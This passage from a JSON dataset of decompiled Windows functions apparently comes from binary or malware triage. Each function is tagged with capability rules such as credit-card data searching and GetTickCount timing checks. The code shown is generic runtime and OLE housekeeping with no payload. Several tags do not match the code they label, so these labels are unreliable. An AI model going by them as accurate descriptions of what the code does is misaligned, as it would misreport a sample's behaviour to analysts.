        "decompiled_code": "\nulong __cdecl fcn.0042564e(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint dwMoveMethod)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    lpDistanceToMoveHigh = arg_10h;\n    iVar2 = fcn.0042554b(arg_8h);\n    if (iVar2 == -1) {\n        puVar3 = fcn.0041da34();\n        *puVar3 = 9;\ncode_r0x004256a8:\n        iVar2 = -1;\n        lpDistanceToMoveHigh = 0xffffffff;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar2, arg_ch, &lpDistanceToMoveHigh, dwMoveMethod);\n        if (iVar2 == -1) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar4 != 0) {\n                fcn.0041da46(iVar4);\n                goto code_r0x004256a8;\n            }\n        }\n        puVar1 = *((arg_8h >> 5) * 4 + 0x44aba0) + 4 + (arg_8h & 0x1f) * 0x24;\n        *puVar1 = *puVar1 & 0xfd;\n    }\n    return CONCAT44(lpDistanceToMoveHigh, iVar2);\n}\n",
        "token_count": 346
    },
    "0042fc69": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0042fc69(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GlobalFlags)(param_1);\n        for (uVar1 = uVar1 & 0xff; uVar1 != 0; uVar1 = uVar1 - 1) {\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(param_1);\n        }\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(param_1);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00420f39": {
        "rules": [
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688",
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653"
        ],
        "decompiled_code": "\nuint fcn.00420f39(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    if (*0x44af0c == 0) {\n        fcn.0041d4bd();\n    }\n    iVar4 = 0;\n    pcVar3 = *0x449628;\n    if (*0x449628 != NULL) {\n        for (; *pcVar3 != '\\0'; pcVar3 = pcVar3 + iVar2 + 1) {\n            if (*pcVar3 != '=') {\n                iVar4 = iVar4 + 1;\n            }\n            iVar2 = fcn.0041c6f0(pcVar3);\n        }\n        piVar1 = fcn.0041ba5b(iVar4 * 4 + 4);\n        pcVar3 = *0x449628;\n        *0x449658 = piVar1;\n        if (piVar1 != NULL) {\n            do {\n                if (*pcVar3 == '\\0') {\n                    fcn.0041ba6d(*0x449628);\n                    *0x449628 = NULL;\n                    *piVar1 = 0;\n                    *0x44af00 = 1;\n                    return 0;\n                }\n                iVar4 = fcn.0041c6f0(pcVar3);\n                if (*pcVar3 != '=') {\n                    iVar2 = fcn.0041ba5b(iVar4 + 1);\n                    *piVar1 = iVar2;\n                    if (iVar2 == 0) {\n                        fcn.0041ba6d(*0x449658);\n                        *0x449658 = NULL;\n                        return 0xffffffff;\n                    }\n                    fcn.00420ad0(iVar2, pcVar3);\n                    piVar1 = piVar1 + 1;\n                }\n                pcVar3 = pcVar3 + iVar4 + 1;\n            } while( true );\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 444
    },
    "004019f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004019f0(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **ppiVar5;\n    \n    iVar3 = *param_2;\n    iVar4 = *param_1;\n    ppiVar1 = iVar3 + -0x10;\n    ppiVar5 = iVar4 + -0x10;\n    if (ppiVar1 != ppiVar5) {\n        piVar2 = iVar4 + -4;\n        if ((-1 < *(iVar4 + -4)) && (*ppiVar1 == *ppiVar5)) {\n            iVar4 = fcn.004013a0(ppiVar1);\n            LOCK();\n            iVar3 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n            if (iVar3 == 1 || iVar3 + -1 < 0) {\n                (**(**ppiVar5 + 4))(ppiVar5);\n            }\n            *param_1 = iVar4 + 0x10;\n            return param_1;\n        }\n        fcn.00401560(iVar3, *(iVar3 + -0xc));\n    }\n    return param_1;\n}\n",
        "token_count": 295
    },
    "00410370": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00410370(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    if (*(param_1 + 0x14) < param_2) {\n        fcn.004270cf();\n    }\n    uVar2 = *(param_1 + 0x14) - param_2;\n    if (uVar2 < param_3) {\n        param_3 = uVar2;\n    }\n    if (param_3 != 0) {\n        puVar5 = param_1 + 4;\n        puVar4 = puVar5;\n        puVar1 = puVar5;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar4 = *puVar5;\n            puVar1 = *puVar5;\n        }\n        fcn.0041b0f0(puVar4 + param_2, puVar1 + param_3 + param_2, uVar2 - param_3);\n        iVar3 = *(param_1 + 0x14) - param_3;\n        *(param_1 + 0x14) = iVar3;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar5 = *puVar5;\n        }\n        *(puVar5 + iVar3) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 347
    },
    "00410f70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t * fcn.00410f70(int32_t param_1, int32_t param_2, int32_t *param_3)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t **ppiVar7;\n    int32_t *piVar8;\n    \n    if (param_1 == param_2) {\n        return param_3;\n    }\n    do {\n        iVar3 = *(param_2 + -0x10);\n        iVar4 = param_3[-4];\n        iVar6 = param_2 + -0x10;\n        piVar8 = param_3 + -4;\n        ppiVar1 = iVar3 + -0x10;\n        ppiVar7 = iVar4 + -0x10;\n        if (ppiVar1 != ppiVar7) {\n            piVar2 = iVar4 + -4;\n            if ((*(iVar4 + -4) < 0) || (*ppiVar1 != *ppiVar7)) {\n                fcn.00401560(iVar3, *(iVar3 + -0xc));\n            }\n            else {\n                iVar4 = fcn.004013a0(ppiVar1);\n                LOCK();\n                iVar3 = *piVar2;\n                *piVar2 = *piVar2 + -1;\n                if (iVar3 == 1 || iVar3 + -1 < 0) {\n                    (**(**ppiVar7 + 4))(ppiVar7);\n                }\n                *piVar8 = iVar4 + 0x10;\n            }\n        }\n        iVar3 = *(param_2 + -0xc);\n        iVar4 = param_3[-3];\n        ppiVar1 = iVar3 + -0x10;\n        ppiVar7 = iVar4 + -0x10;\n        if (ppiVar1 != ppiVar7) {\n            if ((*(iVar4 + -4) < 0) || (*ppiVar1 != *ppiVar7)) {\n                fcn.00401560(iVar3, *(iVar3 + -0xc));\n            }\n            else {\n                iVar5 = fcn.004013a0(ppiVar1);\n                piVar2 = iVar4 + -4;\n                LOCK();\n                iVar3 = *piVar2;\n                *piVar2 = *piVar2 + -1;\n                if (iVar3 == 1 || iVar3 + -1 < 0) {\n                    (**(**ppiVar7 + 4))(ppiVar7);\n                }\n                param_3[-3] = iVar5 + 0x10;\n            }\n        }\n        param_3[-2] = *(param_2 + -8);\n        *(param_3 + -1) = *(param_2 + -4);\n        param_2 = iVar6;\n        param_3 = piVar8;\n    } while (iVar6 != param_1);\n    return piVar8;\n}\n",
        "token_count": 658
    },
    "00413f3a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nbool __cdecl\nfcn.00413f3a(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint var_8h;\n    uint var_10h;\n    uint var_10h_2;\n    uint var_14h_2;\n    uint var_18h_2;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = &var_18h;\n    piVar4 = *(extraout_ECX + 0x1c);\n    *(unaff_EBP + -0x14) = 0;\n    iVar1 = *piVar4;\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    iVar1 = (**(iVar1 + 0x128))(extraout_ECX, unaff_EBP + -0x14, *(unaff_EBP + 0x20), *(unaff_EBP + 0xc));\n    if ((iVar1 != 0) && (*(unaff_EBP + -0x14) == 0)) {\n        iVar1 = fcn.00431a51();\n        uVar2 = (**(**(iVar1 + 0x1038) + 0xc))(extraout_ECX);\n        *(unaff_EBP + -0x14) = uVar2;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + -0x14) == NULL) {\n        bVar5 = false;\n    }\n    else {\n        iVar1 = (**(**(unaff_EBP + -0x14) + 0x50))\n                          (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                           *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), *(unaff_EBP + 0x20), *(unaff_EBP + 0x24), \n                           *(unaff_EBP + 0x28), *(unaff_EBP + 0x2c));\n        bVar5 = -1 < iVar1;\n        if (bVar5) {\n            puVar3 = fcn.00428fb1(0xc);\n            if (puVar3 == NULL) {\n                puVar3 = NULL;\n            }\n            else {\n                iVar1 = *(unaff_EBP + -0x14);\n                uVar2 = *(iVar1 + 0x20);\n                puVar3[2] = 0;\n                *puVar3 = uVar2;\n                puVar3[1] = iVar1;\n            }\n            fcn.00427c0e(puVar3);\n            iVar1 = *(unaff_EBP + -0x14);\n            if (*(iVar1 + 0x20) != 0) {\n                piVar4 = fcn.004280dc(*(iVar1 + 0x20));\n                *piVar4 = iVar1;\n                iVar1 = *(unaff_EBP + -0x14);\n            }\n            if (*(unaff_EBP + 0x30) != NULL) {\n                **(unaff_EBP + 0x30) = iVar1;\n            }\n        }\n        else if (*(unaff_EBP + -0x14) != NULL) {\n            (**(**(unaff_EBP + -0x14) + 4))(1);\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return bVar5;\n}\n",
        "token_count": 973
    },
    "00414c12": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00414c12(uint16_t param_1)\n\n{\n    if ((param_1 & 0x4000) != 0) {\n        return 4;\n    }\n    if ((param_1 & 0x2000) != 0) {\n        return 4;\n    }\n    if ((param_1 & 0x1000) != 0) {\n        return 2;\n    }\n    if (0x48 < param_1) {\n        if ((param_1 != 0x80) && (param_1 != 0x81)) {\n            if (param_1 == 0x82) {\n                return 2;\n            }\n            if (param_1 != 0x83) {\n                if (param_1 == 0x85) {\n                    return 2;\n                }\n                if (param_1 == 0x86) {\n                    return 2;\n                }\n                if (param_1 == 0x87) {\n                    return 2;\n                }\n                return 8;\n            }\n        }\ncode_r0x00414c6f:\n        return 1;\n    }\n    if (param_1 == 0x48) {\ncode_r0x00414c44:\n        return 4;\n    }\n    // switch table (20 cases) at 0x414c70\n    switch(param_1) {\n    case 2:\n    case 0xb:\n    case 0x12:\n        return 2;\n    case 3:\n    case 4:\n    case 8:\n    case 9:\n    case 10:\n    case 0xd:\n    case 0x13:\n        goto code_r0x00414c44;\n    default:\n        return 8;\n    case 0x10:\n    case 0x11:\n    case 0x14:\n    case 0x15:\n        goto code_r0x00414c6f;\n    }\n}\n",
        "token_count": 422
    },
    "00417813": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00417813(int32_t param_1)\n\n{\n    uint uVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    if (*(param_1 + 0x48) == 0) {\n        if (*(param_1 + 0x38) != 0) {\n            var_10h = *(param_1 + 0x40);\n            var_ch = 0;\n            var_8h = 0;\n            var_18h = 1;\n            var_14h = 0;\n            uVar1 = (**(**(param_1 + 8) + 0x20))(*(param_1 + 8), 1, 0x43c75c, 0, 0, &var_18h);\n            return uVar1;\n        }\n    }\n    else if ((*(param_1 + 0x50) != 0) && (*(*(param_1 + 0x50) + 0xc) != 0)) {\n        uVar1 = fcn.0041718e();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 271
    },
    "00418d31": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_a0h\n// WARNING: Variable defined which should be unmapped: var_9ch\n// WARNING: Variable defined which should be unmapped: var_94h\n// WARNING: Variable defined which should be unmapped: var_98h\n\nvoid fcn.00418d31(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t *extraout_ECX;\n    int32_t **ppiVar6;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint pv;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = *0x444220;\n    *(unaff_EBP + -0x88) = extraout_ECX[5];\n    iVar2 = extraout_ECX[0x12];\n    *(unaff_EBP + -0x80) = extraout_ECX[4];\n    if (iVar2 == 0) {\n        piVar1 = extraout_ECX[2];\n        if ((piVar1 == NULL) ||\n           (iVar2 = (**(*piVar1 + 0xc))(piVar1, 0x43c04c, unaff_EBP + -0x78, unaff_EBP + -0x7c),  iVar2 < 0))\n        goto code_r0x00419081;\n        fcn.00415e0d(unaff_EBP + -0x70, 0x43c778);\n        *(unaff_EBP + -0x50) = 0xffffffff;\n        *(unaff_EBP + -0x58) = 0;\n        *(unaff_EBP + -0x54) = 0;\n        *(unaff_EBP + -0x4c) = 0x18;\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -0x44) = 0x1fb;\n        fcn.00415e0d(unaff_EBP + -0x40, 0x43c760);\n        *(unaff_EBP + -0x20) = 0xffffffff;\n        *(unaff_EBP + -0x28) = 0x1c;\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x1c) = 0x20;\n        *(unaff_EBP + -0x18) = 0;\n        *(unaff_EBP + -0x14) = 0x1e;\n        iVar2 = (**(**(unaff_EBP + -0x78) + 0x10))(*(unaff_EBP + -0x78), 2, unaff_EBP + -0x70, 0x28, 0);\n        if (iVar2 < 0) {\n            (**(**(unaff_EBP + -0x78) + 8))(*(unaff_EBP + -0x78));\n            goto code_r0x00419081;\n        }\n        *(unaff_EBP + -0xa0) = *(unaff_EBP + -0x7c);\n        *(unaff_EBP + -0x9c) = 1;\n        *(unaff_EBP + -0x98) = 0;\n        *(unaff_EBP + -0x94) = 0;\n        *(unaff_EBP + -0x90) = 0;\n        iVar2 = (**(**(unaff_EBP + -0x78) + 0x18))(*(unaff_EBP + -0x78), 0, 0, unaff_EBP + -0xa0);\n        *(unaff_EBP + -0x84) = iVar2;\n        if (iVar2 < 0) {\n            (**(**(unaff_EBP + -0x78) + 8))(*(unaff_EBP + -0x78));\n            goto code_r0x00419081;\n        }\n        iVar2 = *(unaff_EBP + -0x94);\n        extraout_ECX[5] = *(unaff_EBP + -0x98);\n        *(unaff_EBP + -0x7c) = *(unaff_EBP + -0x8c);\n        extraout_ECX[4] = *(unaff_EBP + -0x8c);\n        piVar1 = *(unaff_EBP + -0x78);\n        extraout_ECX[0xd] = iVar2;\n        (**(*piVar1 + 8))(piVar1);\n    }\n    else {\n        iVar2 = (**(*extraout_ECX[0x13] + 0x14))(extraout_ECX[0x13], 0x43c25c, unaff_EBP + -0x74);\n        *(unaff_EBP + -0x84) = iVar2;\n        if (iVar2 < 0) goto code_r0x00419081;\n        iVar2 = (****(unaff_EBP + -0x74))(*(unaff_EBP + -0x74), 0x43c1ec, unaff_EBP + -0x7c);\n        if (-1 < iVar2) {\n            *(unaff_EBP + -0x78) = 0;\n            iVar2 = (**(**(unaff_EBP + -0x7c) + 0x10))(*(unaff_EBP + -0x7c), 0x43c37c, unaff_EBP + -0x78);\n            if (-1 < iVar2) {\n                (**(**(unaff_EBP + -0x78) + 0x14))(*(unaff_EBP + -0x78), extraout_ECX[1] + 0xe4, extraout_ECX + 0x16);\n                (**(**(unaff_EBP + -0x78) + 8))(*(unaff_EBP + -0x78));\n            }\n            (**(**(unaff_EBP + -0x7c) + 8))(*(unaff_EBP + -0x7c));\n        }\n        iVar2 = fcn.00428fb1(0x14);\n        if (iVar2 == 0) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = fcn.00417c4b(*(unaff_EBP + -0x74));\n        }\n        extraout_ECX[0x14] = iVar2;\n        (**(**(unaff_EBP + -0x74) + 8))(*(unaff_EBP + -0x74));\n        iVar2 = *extraout_ECX[0x14];\n        if (iVar2 != 0) {\n            fcn.0041608b(iVar2, extraout_ECX[0x14] + 1);\n        }\n        iVar2 = fcn.00428fb1(0x28);\n        if (iVar2 == 0) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = fcn.00414adc(0, 8000);\n        }\n        extraout_ECX[0x15] = iVar2;\n        fcn.00418761(*extraout_ECX[0x14]);\n        *(extraout_ECX[0x14] + 8) = extraout_ECX[0x15];\n        iVar2 = *(extraout_ECX[0x15] + 0xc);\n        extraout_ECX[4] = iVar2;\n        iVar2 = (*_sym.imp.ole32.dll_CoTaskMemAlloc)(iVar2 * 0x28);\n        extraout_ECX[5] = iVar2;\n        fcn.0041cc60(iVar2, 0, extraout_ECX[4] * 0x28);\n        fcn.0041864b();\n        fcn.00416048();\n    }\n    iVar2 = extraout_ECX[4];\n    *(unaff_EBP + -0x74) = 0;\n    if (0 < iVar2) {\n        iVar2 = 0;\n        do {\n            iVar3 = fcn.00428fb1(0x1c);\n            *(unaff_EBP + -0x7c) = iVar3;\n            *(unaff_EBP + -4) = 0;\n            if (iVar3 == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = fcn.00427b60(0x1c, 10);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            iVar3 = extraout_ECX[5];\n            *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + 1;\n            *(iVar2 + 0x24 + iVar3) = uVar4;\n            iVar2 = iVar2 + 0x28;\n        } while (*(unaff_EBP + -0x74) < extraout_ECX[4]);\n    }\n    if (*(unaff_EBP + -0x88) != 0) {\n        if (0 < *(unaff_EBP + -0x80)) {\n            ppiVar6 = *(unaff_EBP + -0x88) + 0x24;\n            *(unaff_EBP + -0x74) = *(unaff_EBP + -0x80);\n            *(unaff_EBP + -0x7c) = -0x24 - *(unaff_EBP + -0x88);\n            do {\n                iVar2 = (*ppiVar6)[1];\n                *(unaff_EBP + -0x80) = iVar2;\n                while (iVar2 != 0) {\n                    puVar5 = fcn.00411acd(unaff_EBP + -0x80);\n                    (**(*extraout_ECX + 8))(*puVar5, 1);\n                    iVar2 = *(unaff_EBP + -0x80);\n                }\n                fcn.00427a9b();\n                if (*ppiVar6 != NULL) {\n                    (**(**ppiVar6 + 4))(1);\n                }\n                ppiVar6 = ppiVar6 + 10;\n                piVar1 = unaff_EBP + -0x74;\n                *piVar1 = *piVar1 + -1;\n            } while (*piVar1 != 0);\n        }\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(*(unaff_EBP + -0x88));\n    }\ncode_r0x00419081:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 2563
    },
    "00419546": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: pvargDest\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00419546(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint pvargDest;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    *extraout_ECX = vtable.CDataSourceControl.0;\n    pcVar1 = extraout_ECX[0x16];\n    *(unaff_EBP + -4) = 0;\n    if (((pcVar1 != NULL) && (extraout_ECX[0x14] != NULL)) &&\n       (puVar2 = *extraout_ECX[0x14],  iVar5 = (***puVar2)(puVar2, 0x43c1ec, unaff_EBP + -0x14),  -1 < iVar5)) {\n        *(unaff_EBP + -0x10) = 0;\n        iVar5 = (**(**(unaff_EBP + -0x14) + 0x10))(*(unaff_EBP + -0x14), 0x43c37c, unaff_EBP + -0x10);\n        if (-1 < iVar5) {\n            (**(**(unaff_EBP + -0x10) + 0x18))(*(unaff_EBP + -0x10), extraout_ECX[0x16]);\n            (**(**(unaff_EBP + -0x10) + 8))(*(unaff_EBP + -0x10));\n        }\n        (**(**(unaff_EBP + -0x14) + 8))(*(unaff_EBP + -0x14));\n    }\n    while (extraout_ECX[9] != NULL) {\n        ppiVar3 = *(extraout_ECX[7] + 8);\n        (**(**ppiVar3 + 0xbc))(ppiVar3[2], 0);\n        (*ppiVar3)[0x25] = 0;\n    }\n    *(unaff_EBP + -0x18) = extraout_ECX + 6;\n    fcn.00427a9b();\n    if (extraout_ECX[0x10] != NULL) {\n        iVar5 = 0;\n        pcVar1 = extraout_ECX[0xe];\n        if (0 < pcVar1) {\n            *(unaff_EBP + -0x10) = 0;\n            do {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(extraout_ECX[0x10] + *(unaff_EBP + -0x10));\n                *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + 0x10;\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < extraout_ECX[0xe]);\n            pcVar1 = extraout_ECX[0xe];\n        }\n        if (pcVar1 != NULL) {\n            fcn.00428fdc(extraout_ECX[0xf]);\n            fcn.00428fdc(extraout_ECX[0x10]);\n        }\n    }\n    piVar6 = extraout_ECX[2];\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\n    piVar6 = extraout_ECX[3];\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\n    if (extraout_ECX[5] != NULL) {\n        pcVar1 = extraout_ECX[4];\n        *(unaff_EBP + -0x10) = 0;\n        if (0 < pcVar1) {\n            iVar5 = 0;\n            do {\n                iVar4 = *(*(extraout_ECX[5] + iVar5 + 0x24) + 4);\n                *(unaff_EBP + -0x14) = iVar4;\n                while (iVar4 != 0) {\n                    piVar6 = fcn.00411acd(unaff_EBP + -0x14);\n                    iVar4 = *(unaff_EBP + -0x14);\n                    *(*piVar6 + 0x94) = 0;\n                }\n                fcn.00427a9b();\n                if (*(extraout_ECX[5] + iVar5 + 0x24) != NULL) {\n                    (**(**(extraout_ECX[5] + iVar5 + 0x24) + 4))(1);\n                }\n                *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) + 1;\n                iVar5 = iVar5 + 0x28;\n            } while (*(unaff_EBP + -0x10) < extraout_ECX[4]);\n        }\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(extraout_ECX[5]);\n    }\n    if (extraout_ECX[0xd] != NULL) {\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(extraout_ECX[0xd]);\n    }\n    if (extraout_ECX[0x15] != NULL) {\n        fcn.0041866e(*extraout_ECX[0x14]);\n        fcn.00414b05();\n    }\n    pcVar1 = extraout_ECX[0x15];\n    if (pcVar1 != NULL) {\n        fcn.00414b05();\n        fcn.00428fdc(pcVar1);\n    }\n    pcVar1 = extraout_ECX[0x14];\n    if (pcVar1 != NULL) {\n        fcn.00419313();\n        fcn.00428fdc(pcVar1);\n    }\n    piVar6 = extraout_ECX[0x13];\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\n    piVar6 = extraout_ECX[0x12];\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))(piVar6);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00427b83();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1521
    },
    "00419f47": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00419f47(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    code *pcVar5;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    *extraout_ECX = vtable.COleControlSite.0;\n    pcVar5 = extraout_ECX[7];\n    *(unaff_EBP + -4) = 2;\n    if ((pcVar5 != NULL) && (*(pcVar5 + 0x68) == extraout_ECX)) {\n        *(pcVar5 + 0x68) = 0;\n    }\n    pcVar5 = extraout_ECX[0x23];\n    if (pcVar5 != NULL) {\n        fcn.00419546();\n        fcn.00428fdc(pcVar5);\n    }\n    fcn.00415439();\n    fcn.004150ba(extraout_ECX + 0xf, extraout_ECX[0x17]);\n    fcn.004150ba(0x43c18c, extraout_ECX[0x18]);\n    fcn.004150ba(0x43c01c, extraout_ECX[0x22]);\n    piVar1 = extraout_ECX[0x16];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1);\n        extraout_ECX[0x16] = NULL;\n    }\n    piVar1 = extraout_ECX[0x14];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0x14))(piVar1);\n        (**(*extraout_ECX[0x14] + 8))(extraout_ECX[0x14]);\n        extraout_ECX[0x14] = NULL;\n    }\n    piVar1 = extraout_ECX[0x15];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1);\n        extraout_ECX[0x15] = NULL;\n    }\n    piVar1 = extraout_ECX[0x13];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0xc))(piVar1, 0);\n        (**(*extraout_ECX[0x13] + 0x18))(extraout_ECX[0x13], 1);\n        (**(*extraout_ECX[0x13] + 8))(extraout_ECX[0x13]);\n        extraout_ECX[0x13] = NULL;\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(extraout_ECX + 0x2a);\n    pcVar5 = extraout_ECX[0x24];\n    *(unaff_EBP + -0x10) = 0;\n    while (pcVar5 != NULL) {\n        pcVar2 = *(pcVar5 + 0x18);\n        *(unaff_EBP + -0x14) = pcVar2;\n        if (*(unaff_EBP + -0x10) == 0) {\n            extraout_ECX[0x24] = pcVar2;\n        }\n        else {\n            *(*(unaff_EBP + -0x10) + 0x18) = pcVar2;\n        }\n        iVar3 = *(pcVar5 + 0xc);\n        if ((iVar3 != 0) && (*(iVar3 + 0x8c) != 0)) {\n            (**(**(iVar3 + 0x8c) + 4))(pcVar5, 0);\n        }\n        fcn.00428fdc(pcVar5);\n        if (*(unaff_EBP + -0x10) != 0) {\n            *(unaff_EBP + -0x10) = *(*(unaff_EBP + -0x10) + 0x18);\n        }\n        pcVar5 = *(unaff_EBP + -0x14);\n    }\n    if (((extraout_ECX[0x26] != NULL) && (extraout_ECX[0x25] != NULL)) &&\n       (ppiVar4 = extraout_ECX[0x25] + 0x8c,  *ppiVar4 != NULL)) {\n        (**(**ppiVar4 + 8))(extraout_ECX, 0);\n    }\n    if ((extraout_ECX[7] != NULL) && (extraout_ECX[0x1c] != NULL)) {\n        piVar1 = extraout_ECX[7] + 0x70;\n        *piVar1 = *piVar1 + -1;\n    }\n    *(unaff_EBP + -4) = 1;\n    fcn.00434560();\n    fcn.004011b0();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00428b21();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1233
    },
    "0041bcd0": {
        "rules": [
